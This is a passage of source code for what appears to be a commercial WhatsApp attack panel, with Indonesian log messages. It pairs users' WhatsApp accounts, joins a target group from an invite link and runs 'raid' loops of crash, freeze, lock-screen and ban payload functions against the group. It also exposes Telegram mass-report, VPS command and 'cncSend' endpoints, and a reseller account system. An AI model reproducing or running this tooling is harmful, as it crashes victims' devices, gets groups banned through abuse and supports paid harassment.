    role: user.role
  });

  res.json({
    valid: true,
    sended: true,
    message: "Proses raid dimulai..."
  });

  setImmediate(async () => {
    try {
      let sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        console.log(`[❌ SESSION ERROR] Tidak ada sesi aktif`);
        return;
      }

      let usedSenderId = sock.user?.id?.split('@')[0] || 'unknown';
      let usedSocket = sock;

      console.log(`[🔒 PRIVATE MODE] Using own sender: ${usedSenderId}`);

      let code = null;
      try {
        const urlObj = new URL(link);
        const pathParts = urlObj.pathname.split('/');
        code = pathParts[pathParts.length - 1];
      } catch (urlError) {
        const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22,})/i);
        if (match) code = match[1];
      }

      if (!code) {
        console.log(`[❌ ERROR] Gagal ekstrak Invite Code`);
        return;
      }

      let groupJid;
      try {
        groupJid = await usedSocket.groupAcceptInvite(code);
        console.log(`[✅ JOINED] Berhasil masuk ke: ${groupJid}`);
      } catch (err) {
        console.log(`[⚠️ JOIN ERROR] ${err.message}`);
        return;
      }

      if (groupJid) {
        console.log(`[🚀 SENDING BUG] '${bug}' ke ${groupJid}`);

        switch (bug) {
  case "fc_gb":
    for (let i = 0; i < 70; i++) {
      await fcgb(usedSocket, groupJid);
      await fcGrup(usedSocket, groupJid);
      await sleep(2000);
    }
     break;
  case "blanks":
    for (let i = 0; i < 50; i++) {
      await CrashLockScreenGb(usedSocket, groupJid);
      await PayXGroup(usedSocket, groupJid);
      await CrashLockScreenGb(usedSocket, groupJid);
      await CatalogBug(usedSocket, groupJid);
      await BlankXFreeze(usedSocket, groupJid);
      await satz(usedSocket, groupJid);
      await VampireBugIns(usedSocket, groupJid);
      await BlankGroupEraV1(usedSocket, groupJid);
      await BlankScreenV1(usedSocket, groupJid);
      await sleep(3000);
    }
      break;
  case "stucklog":
    for (let i = 0; i < 50; i++) {
      await PayXGroup(usedSocket, groupJid);
      await CrashLockScreenGb(usedSocket, groupJid);
      await CatalogBug(usedSocket, groupJid);
      await BlankXFreeze(usedSocket, groupJid);
      await VampireBugIns(usedSocket, groupJid);
      await BlankScreenV1(usedSocket, groupJid);
      await sleep(2000);
    }
      break;
  case "ban":
    for (let i = 0; i < 30; i++) {
      await BanGroupNew(usedSocket, groupJid);
      await sleep(500);
      await groupBan(usedSocket, groupJid);
      await sleep(500);
      await groupBan1(usedSocket, groupJid);
      await sleep(500);
    }
      break;
  case "delayz":
    for (let i = 0; i < 50; i++) {
      await DelayGroupNew(usedSocket, groupJid);
      await satz(usedSocket, groupJid);
      await sleep(1500);
    }
    break;
  default:
    console.log(`[⚠️] Tipe bug '${bug}' tidak dikenali`);
    break;
}
        console.log(`[🏁 FINISHED] Raid selesai via sender ${usedSenderId}\n`);
      }
    } catch (e) {
      console.log(`[❌ ERROR] ${e.message}`);
    }
  });
});

function canUseGlobalSender(role) {
  const allowedRoles = ['admin', 'owner', 'moderator', 'staff', 'developer'];
  return allowedRoles.includes(role?.toLowerCase());
}

function getAllActiveSenders() {
  const allSenders = [];
  const sessionDir = path.join(__dirname, 'session');

  if (!fs.existsSync(sessionDir)) {
    return allSenders;
  }

  const users = fs.readdirSync(sessionDir).filter(f => {
    const p = path.join(sessionDir, f);
    return fs.lstatSync(p).isDirectory();
  });

  for (const user of users) {
    const userDir = path.join(sessionDir, user);
    if (!fs.existsSync(userDir)) continue;

    const sessions = fs.readdirSync(userDir).filter(f => f.endsWith('.json'));

    for (const ses of sessions) {
      const senderId = ses.replace('.json', '');

      const sock = activeConnections[senderId] || mess[senderId] || biz[senderId];

      if (sock && sock.user && sock.ws && sock.ws.readyState === 1) {
        allSenders.push({
          senderId: senderId,
          owner: user,
          socket: sock,
        });
      } else if (sock && sock.user) {
        try {
          sock.sendPresenceUpdate('available');
          allSenders.push({
            senderId: senderId,
            owner: user,
            socket: sock,
          });
        } catch (err) {
          console.log(`[SKIP] ${senderId} not ready, removing...`);
          delete activeConnections[senderId];
          delete mess[senderId];
          delete biz[senderId];
        }
      }
    }
  }

  return allSenders;
}

function getActiveCredsInFolder(username) {
  try {
    const folderPath = path.join(__dirname, "session", username);

    if (!fs.existsSync(folderPath)) return [];

    const numbers = fs.readdirSync(folderPath);
    const activeCreds = [];

    for (const number of numbers) {
      const sessionPath = path.join(folderPath, number);

      if (!fs.lstatSync(sessionPath).isDirectory()) continue;

      const credsPath = path.join(sessionPath, "creds.json");

      if (fs.existsSync(credsPath)) {
        if (activeConnections[number]) {
          activeCreds.push({
            sessionName: number
          });
        }
      }
    }

    return activeCreds;

  } catch (err) {
    console.log("❌ ERROR getActiveCredsInFolder:", err);
    return [];
  }
}

app.get('/getGlobalBugs', (req, res) => {
    res.json({
        status: true,
        bugs: globalBugs
    });
});

app.get('/groupBugs', (req, res) => {
    res.json({
        status: true,
        bugs: groupBugs
    });
});

app.get("/getServerInfo", (req, res) => {
  const uptime = os.uptime();

  const serverInfo = {
    platform: os.platform(),
    hostname: os.hostname(),
    uptimeSeconds: uptime,
    uptimeHours: (uptime / 3600).toFixed(2),
    cpu: os.cpus()[0].model,
    core: os.cpus().length,
    memory: getMemoryInfo(),
    loadAverage: os.loadavg(),
    timestamp: new Date().toISOString(),
  };

  res.json({
    status: true,
    message: "Server info retrieved",
    data: serverInfo,
  });
});

app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const conns = getActiveCredsInFolder(user.username);
  console.log(user.username)
  return res.json({
    valid: true,
    connections: conns
  });
});

let usePairingCode = true;

app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];

  if (!keyInfo) {
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });
  if (!number) return res.status(400).json({ error: "Number is required" });

  addActivityLog(user.username, 'get_pairing', {
    number: number,
    role: user.role
  });

  try {
    const sessionDir = path.join(__dirname, "session", user.username, number);
    const userSessionFolder = path.join(__dirname, "session", user.username);

    if (!fs.existsSync(userSessionFolder)) {
      fs.mkdirSync(userSessionFolder, { recursive: true });
    }

    const userSessionDir = path.join("session", user.username);

    if (fs.existsSync(userSessionDir)) {
      const allNumbers = fs.readdirSync(userSessionDir);

      for (const folder of allNumbers) {
        if (folder !== number) {
          const target = path.join(userSessionDir, folder);
          fs.rmSync(target, { recursive: true, force: true });
          console.log(`🗑️ Menghapus session nomor lama: ${folder}`);
        }
      }
    }

    if (fs.existsSync(sessionDir)) {
      try {
        fs.rmSync(sessionDir, { recursive: true, force: true });
        console.log(`🗑️ Session lama untuk ${number} DIHAPUS otomatis!`);
      } catch (err) {
        console.log(`❌ Gagal hapus session:`, err);
      }
    }

    if (!fs.existsSync(sessionDir)) {
      fs.mkdirSync(sessionDir, { recursive: true });
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    const sock = makeWASocket({
      printQRInTerminal: false,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 30000,
      defaultQueryTimeoutMs: 0,
      keepAliveIntervalMs: 10000,
      generateHighQualityLinkPreview: true,

      patchMessageBeforeSending: (message) => {
        const requiresPatch = !!(
          message.buttonsMessage ||
          message.templateMessage ||
          message.listMessage
        );

        if (requiresPatch) {
          message = {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadataVersion: 2,
                  deviceListMetadata: {}
                },
                ...message
              }
            }
          };
        }
        return message;
      },

      version: (await (await fetch(
        "https://raw.githubusercontent.com/WhiskeySockets/Baileys/master/src/Defaults/baileys-version.json"
      )).json()).version,

     browser: ["Ubuntu", "Chrome", "20.0.04"],
      logger: pino({ level: "silent" }),
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(
          state.keys,
          pino().child({ level: "silent", stream: "store" })
        )
      }
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "close") {
        const isLoggedOut =
          lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;

        if (!isLoggedOut) {
          console.log(`🔄 Reconnecting ${number}...`);
          await waiting(3000);
          await pairingWa(number, user.username);
        } else {
          delete activeConnections[number];
        }
      }
    });

    if (!sock.authState.creds.registered) {
      await waiting(1000);
      let code = await sock.requestPairingCode(number, "DANZNIEH")
      console.log("PAIRING CODE:", code);

      if (code) {
        return res.json({ valid: true, number, pairingCode: code });
      } else {
        return res.json({
          valid: false,
          message: "Failed to get pairing code"
        });
      }
    }

  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.get("/getNotifications", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Key tidak valid" });
  }

  const NOTIF_FILE = path.join(DATABASE_DIR, 'notifications.json');
  let notifications = [];

  if (fs.existsSync(NOTIF_FILE)) {
    try {
      const raw = fs.readFileSync(NOTIF_FILE, 'utf8');
      const parsed = JSON.parse(raw);
      notifications = Array.isArray(parsed) ? parsed : [];
    } catch (e) {
      notifications = [];
    }
  }

  return res.json({
    valid: true,
    notifications: notifications,
  });
});

app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day, role = "member" } = req.query;
  const keyInfo = activeKeys[key];

  if (!keyInfo) {
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || !["reseller", "admin", "owner", "developer"].includes(creator.role)) {
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  const roleLevel = {
    developer: 5,
    owner: 4,
    admin: 3,
    moderator: 2,
    reseller: 1,
    member: 0
  };

  const creatorLevel = roleLevel[creator.role] ?? -1;
  const newRoleLevel = roleLevel[role] ?? -1;

  if (creatorLevel <= newRoleLevel) {
    return res.json({
      valid: true,
      created: false,
      message: `Role ${creator.role} tidak bisa membuat role ${role}`
    });
  }

  if (creator.role === "reseller" && parseInt(day) > 30) {
    return res.json({
      valid: true,
      created: false,
      invalidDay: true,
      message: "Reseller max 30 hari."
    });
  }

  if (db.find(u => u.username === newUser)) {
    return res.json({
      valid: true,
      created: false,
      message: "Username already exists."
    });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));
  expired.setHours(23, 59, 59, 999);

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: role,
  };

  db.push(newAccount);
  saveDatabase(db);

  const logLine = `${creator.username} Created ${newUser} role ${role} duration ${day}\n`;
  fs.appendFileSync(LOG_FILE, logLine);

  addActivityLog(creator.username, 'create_account', {
    new_user: newUser,
    role: role,
    days: parseInt(day),
    creator_role: creator.role
  });

  return res.json({
    valid: true,
    created: true,
    user: newAccount
  });
});

app.post('/chat/send', (req, res) => {
  const { userId, username, role, message } = req.body;
  const data = readMessages();
  const newMessage = {
    id: `msg_${getNextId()}`,
    userId,
    username,
    role,
    message,
    voiceUrl: null,
    imageUrl: null,
    timestamp: new Date().toISOString(),
    avatarUrl: 'assets/logo.jpg',
    isDeleted: false
  };
  data.messages.push(newMessage);
  writeMessages(data);

  addActivityLog(username, 'chat_send', {
    message_id: newMessage.id,
    role: role
  });

  res.json({ success: true, message: newMessage });
});

app.post('/chat/upload-image', upload.single('image'), (req, res) => {
  const { userId, username, role } = req.body;
  const imageUrl = `${req.protocol}://${req.get('host')}/uploads/images/${req.file.filename}`;
  const data = readMessages();
  const newMessage = {
    id: `msg_${getNextId()}`,
    userId,
    username,
    role,
    message: null,
    voiceUrl: null,
    imageUrl,
    timestamp: new Date().toISOString(),
    avatarUrl: 'assets/logo.jpg',
    isDeleted: false
  };
  data.messages.push(newMessage);
  writeMessages(data);

  addActivityLog(username, 'chat_upload_image', {
    message_id: newMessage.id,
    image_url: imageUrl,
    role: role
  });

  res.json({ success: true, message: newMessage });
});

app.get('/chat/messages', (req, res) => {
  const data = readMessages();
  const filteredMessages = data.messages.filter(msg => !msg.isDeleted);
  res.json(filteredMessages);
});

app.get("/getAllActiveSenders", (req, res) => {
  const { privateUsername } = req.query;

  const sessionDir = path.join(__dirname, 'session');

  if (!fs.existsSync(sessionDir)) {
    return res.json({
      status: true,
      private_active: 0,
      global_active: 0
    });
  }

  try {
    const allGlobalSenders = getAllActiveSenders();
    const globalActive = allGlobalSenders.length;

    let privateActive = 0;
    if (privateUsername) {
      const userDir = path.join(sessionDir, privateUsername);
      if (fs.existsSync(userDir)) {
        const sessions = fs.readdirSync(userDir).filter(f => f.endsWith('.json'));
        for (const ses of sessions) {
          const senderId = ses.replace('.json', '');
          if (activeConnections[senderId] || mess[senderId] || biz[senderId]) {
            privateActive++;
          }
        }
      }
    }

    res.json({
      status: true,
      private_active: privateActive,
      global_active: globalActive
    });

  } catch (error) {
    res.json({
      status: false,
      private_active: 0,
      global_active: 0
    });
  }
});

app.get("/getActivityLogs", (req, res) => {
  const { key, limit = 50 } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, error: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.json({ valid: false, error: "User not found" });
  }

  let allLogs = [];
  try {
    const ACTIVITY_LOG_PATH = path.join(DATABASE_DIR, 'userActivity.json');
    if (fs.existsSync(ACTIVITY_LOG_PATH)) {
      const raw = fs.readFileSync(ACTIVITY_LOG_PATH, 'utf8');
      allLogs = JSON.parse(raw);
      if (!Array.isArray(allLogs)) allLogs = [];
    }
  } catch (e) {
    allLogs = [];
  }

  let logs = allLogs;
  if (user.role !== 'developer') {
    logs = allLogs.filter(log => log.username === user.username);
  }

  logs = logs.reverse().slice(0, parseInt(limit));

  return res.json({
    valid: true,
    logs: logs,
  });
});

app.post("/addActivityLog", (req, res) => {
  const { key, activity, details } = req.body;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, error: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.json({ valid: false, error: "User not found" });
  }

  const newLog = addActivityLog(user.username, activity, details || {});

  return res.json({
    valid: true,
    log: newLog
  });
});

app.get("/cleanActivityLogs", (req, res) => {
  const { key, days = 30 } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, error: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || user.role !== "developer") {
    return res.json({ valid: false, error: "Only developer can clean logs" });
  }

  const cleaned = cleanOldLogs(parseInt(days));

  return res.json({
    valid: true,
    cleaned: cleaned,
    message: cleaned ? `Logs older than ${days} days cleaned` : "No logs to clean"
  });
});

app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  const keyInfo = activeKeys[key];

  if (!keyInfo) {
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);
  const target = db.find(u => u.username === username);

  if (!admin) {
    return res.json({ valid: false, message: "Admin not found." });
  }

  if (!target) {
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  const roleLevel = {
    developer: 5,
    owner: 4,
    admin: 3,
    moderator: 2,
    reseller: 1,
    user: 0
  };

  const adminLevel = roleLevel[admin.role] ?? -1;
  const targetLevel = roleLevel[target.role] ?? -1;

  if (adminLevel <= targetLevel) {
    return res.json({
      valid: true,
      authorized: false,
      message: `Role ${admin.role} tidak bisa menghapus ${target.role}`
    });
  }

  const index = db.findIndex(u => u.username === username);
  db.splice(index, 1);
  saveDatabase(db);

  const logLine = `${admin.username} Deleted ${target.username}\n`;
  fs.appendFileSync(LOG_FILE, logLine);

  return res.json({
    valid: true,
    deleted: true,
    user: target
  });
});

app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }
  const db = loadDatabase();
  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
  }));

  // Selalu baca database terbaru agar jumlah username ikut berubah
  // otomatis saat user ditambah atau dihapus.
  return res.json({
    valid: true,
    authorized: true,
    totalUsers: users.length,
    users
  });
});

app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || creator.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Only owner can add user with role." });
  }

  if (db.find(u => u.username === username)) {
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: role || "member",
    expiredDate: expired.toISOString().split("T")[0],
  };

  db.push(newUser);
  saveDatabase(db);
  const logLine = `${creator.username} Created ${newUser} Role ${role} Days ${day}\n`;
  fs.appendFileSync(LOG_FILE, logLine);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  if (!editor || !["reseller", "admin", "owner"].includes(editor.role)) {
    return res.json({ valid: true, authorized: false, message: "Only reseller or owner can edit user." });
  }

  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only add up to 30 days." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  if (editor.role === "reseller" && targetUser.role !== "member") {
    return res.json({ valid: true, edited: false, message: "Reseller hanya bisa mengedit user dengan role 'member'." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser} Add Days ${addDays}\n`;
  fs.appendFileSync(LOG_FILE, logLine);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

app.get('/xneuron/sessions', (req, res) => {
  const { key } = req.query;
  const auth = xnValidateKey(key);
  if (!auth.valid) return res.json({ valid: false, message: 'Key tidak valid' });

  try {
    const sessions = XNeuron.getUserSessions(auth.username);
    return res.json({ valid: true, sessions });
  } catch (err) {
    return res.json({ valid: false, message: err.message });
  }
});

app.get('/xneuron/new-session', (req, res) => {
  const { key } = req.query;
  const auth = xnValidateKey(key);
  if (!auth.valid) return res.json({ valid: false, message: 'Key tidak valid' });

  try {
    const sessionId = XNeuron.createNewSession(auth.username);
    return res.json({ valid: true, sessionId });
  } catch (err) {
    return res.json({ valid: false, message: err.message });
  }
});

app.get('/xneuron/history', (req, res) => {
  const { key, session } = req.query;
  const auth = xnValidateKey(key);
  if (!auth.valid) return res.json({ valid: false, message: 'Key tidak valid' });
  if (!session) return res.json({ valid: false, message: 'Parameter session diperlukan' });

  try {
    const history = XNeuron.loadSessionHistory(auth.username, session);
    return res.json({ valid: true, chatHistory: history });
  } catch (err) {
    return res.json({ valid: false, message: err.message });
  }
});

app.get('/xneuron/delete', (req, res) => {
  const { key, session } = req.query;
  const auth = xnValidateKey(key);
  if (!auth.valid) return res.json({ valid: false, message: 'Key tidak valid' });
  if (!session) return res.json({ valid: false, message: 'Parameter session diperlukan' });

  try {
    XNeuron.deleteSession(auth.username, session);
    return res.json({ valid: true, message: 'Session berhasil dihapus' });
  } catch (err) {
    return res.json({ valid: false, message: err.message });
  }
});

app.get('/xneuron/send', async (req, res) => {
  const { key, session, message } = req.query;
  const auth = xnValidateKey(key);
  if (!auth.valid) return res.json({ valid: false, message: 'Key tidak valid' });
  if (!session) return res.json({ valid: false, message: 'Parameter session diperlukan' });
  if (!message) return res.json({ valid: false, message: 'Parameter message diperlukan' });

  try {
    const result = await XNeuron.xNeuronChat(message, auth.username, session, null);
    addActivityLog(auth.username, 'xneuron_chat', { session, message_preview: message.slice(0, 50) });
    return res.json(result);
  } catch (err) {
    return res.json({ status: false, message: err.message });
  }
});

app.post('/xneuron/send', xneuronUpload.single('media'), async (req, res) => {
  const { key, session, message } = req.body;
  const auth = xnValidateKey(key);
  if (!auth.valid) return res.json({ valid: false, message: 'Key tidak valid' });
  if (!session) return res.json({ valid: false, message: 'Parameter session diperlukan' });
  if (!message && !req.file) return res.json({ valid: false, message: 'Harus ada message atau file' });

  try {
    const imagePath = req.file ? req.file.path : null;
    const userMessage = message || '(Gambar dikirim)';
    const result = await XNeuron.xNeuronChat(userMessage, auth.username, session, imagePath);

    if (imagePath) {
      const imageUrl = `${req.protocol}://${req.get('host')}/uploads/xneuron/${req.file.filename}`;
      result.data.imageUrl = imageUrl;
    }

    addActivityLog(auth.username, 'xneuron_chat', {
      session,
      has_image: !!imagePath,
      message_preview: userMessage.slice(0, 50),
    });
    return res.json(result);
  } catch (err) {
    return res.json({ status: false, message: err.message });
  }
});

app.post('/xneuron/generate', xneuronUpload.single('image'), async (req, res) => {
  const { key, prompt } = req.body;
  const auth = xnValidateKey(key);
  if (!auth.valid) return res.json({ valid: false, message: 'Key tidak valid' });
  if (!prompt) return res.json({ valid: false, message: 'Parameter prompt diperlukan' });
  if (!req.file) return res.json({ valid: false, message: 'File gambar referensi diperlukan' });

  try {
    const result = await XNeuron.xNeuronGenerate(prompt, req.file.path);
    addActivityLog(auth.username, 'xneuron_generate', { prompt: prompt.slice(0, 50) });
    return res.json(result);
  } catch (err) {
    return res.json({ status: false, message: err.message });
  }
});

app.post('/xneuron/analyze', xneuronUpload.single('media'), async (req, res) => {
  const { key, question } = req.body;
  const auth = xnValidateKey(key);
  if (!auth.valid) return res.json({ valid: false, message: 'Key tidak valid' });
  if (!req.file) return res.json({ valid: false, message: 'File media diperlukan' });

  const userQuestion = question || 'Jelaskan isi gambar ini secara detail';

  try {
    const result = await XNeuron.analyzeMedia(req.file.path, userQuestion, []);
    addActivityLog(auth.username, 'xneuron_analyze', { question: userQuestion.slice(0, 50) });
    return res.json({
      status: result.success,
      data: {
        message: result.answer || 'Gagal menganalisis media',
        source: result.source || 'auto',
        imageUrl: `${req.protocol}://${req.get('host')}/uploads/xneuron/${req.file.filename}`,
      },
    });
  } catch (err) {
    return res.json({ status: false, message: err.message });
  }
});

app.post('/xneuron/upload-tmp', xneuronUpload.single('file'), async (req, res) => {
  const { key } = req.body;
  const auth = xnValidateKey(key);
  if (!auth.valid) return res.json({ valid: false, message: 'Key tidak valid' });
  if (!req.file) return res.json({ valid: false, message: 'File diperlukan' });

  try {
    const result = await XNeuron.uploadTmplink(req.file.path);
    return res.json(result);
  } catch (err) {
    return res.json({ status: false, message: err.message });
  }
});

app.get("/getMyActivity", (req, res) => {
  const key = req.query.key;

  if (!key) {
    return res.json({
      valid: false,
      message: "Key tidak boleh kosong",
    });
  }

  const userData = activitiesDB.find((u) => u.key === key);

  if (!userData) {
    return res.json({
      valid: false,
      message: "Data tidak ditemukan",
      activities: [],
    });
  }

  return res.json({
    valid: true,
    activities: userData.activities.sort((a, b) => b.timestamp - a.timestamp),
  });
});

app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync(LOG_FILE, "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

app.get('/telegram/login', ToolsController.initiateUnifiedTelegramLogin);
app.get('/telegram/auth', ToolsController.submitTelegramAuth);
app.get('/telegram/status', ToolsController.checkLoginStatus);
app.post('/telegram/verify-password', ToolsController.verifySessionPassword);
app.get('/telegram/sessions', ToolsController.getTelegramSessions);
app.get('/telegram/delete-session', ToolsController.removeTeleSes);
app.get('/telegram/refresh-sessions', ToolsController.refreshTelegramSessions);
app.post('/telegram/spam-report', ToolsController.startSpamReport);
app.get('/telegram/report-status', ToolsController.getSpamReportStatus);
app.get("/vps/myServer", VPSController.getMyServer);
app.post("/vps/addServer", VPSController.addServer);
app.post("/vps/delServer", VPSController.deleteServer);
app.post("/vps/sendCommand", VPSController.sendCommand);
app.get("/vps/cncSend", VPSController.cncSend);

const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function prepareAuthFolders() {
  const userId = "session";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    console.error("Buat Folder 'session' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state, saveCreds } = await useMultiFileAuthState(sessionsFold);

      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        printQRInTerminal: false,
        syncFullHistory: false,
        markOnlineOnConnect: true,
        connectTimeoutMs: 30000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 30000,
        generateHighQualityLinkPreview: false,
        version: version,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        logger: pino({ level: "silent" }),
        auth: {
          creds: state.creds,
          keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
        }
      });

      sock.ev.on("creds.update", saveCreds);

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;
          console.log(`\n[${sessionName}] Connected.`);
          resolve();
        }
        else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}`);

          if (statusCode === 408 || statusCode === 440 || statusCode === 401) {
            delete activeConnections[sessionName];
            fs.rmSync(sessionsFold, { recursive: true, force: true });
          }
          else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 5000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });

      setInterval(async () => {
        if (sock && sock.user) {
          try {
            await sock.sendPresenceUpdate('available');
          } catch (err) {
            console.log(`Heartbeat ${sessionName} failed`);
          }
        }
      }, 25000);

    } catch (err) {
      console.log(`\n[${sessionName}] Init error: ${err.message}`);
      resolve();
    }
  });
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "session";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    connectSession(sessionFolder, baseName);
  }
}

async function refreshUserSessions() {
  await startUserSessions();
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    return false;
  }
  const sessionDir = path.join('session', owner, number);

  if (!fs.existsSync('session')) fs.mkdirSync('session');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    printQRInTerminal: false,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 30000,
    defaultQueryTimeoutMs: 0,
    keepAliveIntervalMs: 10000,
    generateHighQualityLinkPreview: true,
    patchMessageBeforeSending: (message) => {
      const requiresPatch = !!(message.buttonsMessage || message.templateMessage || message.listMessage);
      if (requiresPatch) {
        message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {} },
              ...message
            }
          }
        };
      }
      return message;
    },
      version: (await (await fetch("https://raw.githubusercontent.com/WhiskeySockets/Baileys/master/src/Defaults/baileys-version.json")).json()).version,
